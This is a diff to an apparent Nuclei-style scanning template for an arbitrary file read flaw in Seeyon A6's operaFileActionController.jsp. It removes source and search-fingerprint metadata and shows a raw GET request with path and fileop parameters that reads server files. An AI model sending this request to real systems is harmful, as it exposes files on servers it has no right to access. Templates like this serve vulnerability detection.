@@ -3,14 +3,8 @@ info:
   name: 致远A6operaFileActionController.jsp任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ae64b438e481a8791eac07da9de9ecee
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ae64b438e481a8791eac07da9de9ecee
-    fofa: + hunter`web.body="seeyonDownLoadPic"`
 http:
 - raw:
   - 'GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1
